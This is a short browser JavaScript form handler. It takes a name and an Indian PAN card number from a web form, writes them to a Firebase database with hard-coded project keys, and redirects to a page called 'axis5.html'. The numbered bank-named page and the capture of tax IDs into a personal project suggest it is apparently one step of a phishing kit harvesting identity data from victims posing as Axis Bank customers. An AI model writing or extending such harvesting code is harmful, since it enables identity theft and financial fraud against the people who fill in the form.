import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCUz_1-llGeoG20f3B5mBxjgWXAG2qPdcI",
    authDomain: "myfirst-772f2.firebaseapp.com",
    projectId: "myfirst-772f2",
    storageBucket: "myfirst-772f2.firebasestorage.app",
    messagingSenderId: "540088309804",
    appId: "1:540088309804:web:d52187c60c275d140f1989"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const form = document.getElementById('pan-form'); // Use the form's ID
const notification = document.getElementById('notification');

function savePanDetails(event) {
    event.preventDefault(); // Prevent default form submission

    const NameOnPancard = document.getElementById('NameOnPancard').value.trim();
    const PANCardNo = document.getElementById('PANCardNo').value.trim();

    if (NameOnPancard === "" || PANCardNo === "") {
        notification.textContent = "Please fill in all fields.";
        notification.style.color = "red";
        return;
    }

    set(ref(db, 'pancards/' + PANCardNo), {
        NameOnPancard: NameOnPancard,
        PANCardNo: PANCardNo
    })
    .then(() => {
        notification.textContent = "Details added successfully.";
        notification.style.color = "green";
        document.getElementById('NameOnPancard').value = "";
        document.getElementById('PANCardNo').value = "";

        // Redirect to another page after success
        window.location.href = "axis5.html";
    })
    .catch((error) => {
        notification.textContent = "Failed to save data: " + error.message;
        notification.style.color = "red";
    });
}

// Attach event listener to the form
form.addEventListener('submit', savePanDetails);
